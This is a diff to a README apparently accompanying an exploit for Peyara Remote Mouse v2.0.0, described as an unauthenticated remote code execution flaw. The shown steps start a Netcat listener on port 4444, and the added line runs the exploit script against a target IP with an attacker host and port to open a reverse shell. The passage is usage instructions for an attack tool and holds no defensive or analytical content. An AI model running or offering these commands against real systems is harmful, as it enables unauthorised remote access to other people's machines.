@@ -8,6 +8,7 @@ Peyara Remote Mouse v2.0.0 contains an unauthenticated remote code execution vul
 2. Open a terminal and execute the following command to start a Netcat listener on port 4444:
     ```nc -nlvp 4444```
 3. Run the provided script to establish a reverse shell connection. Upon successful execution, you will gain remote access to the target system
+```python3 Peyara.py --target 192.168.1.107 --lhost 192.168.1.110 --lport 4444```
 
 <img src="https://raw.githubusercontent.com/capture0x/Peyara/refs/heads/main/peyara1.png" width="100%"></img>
 
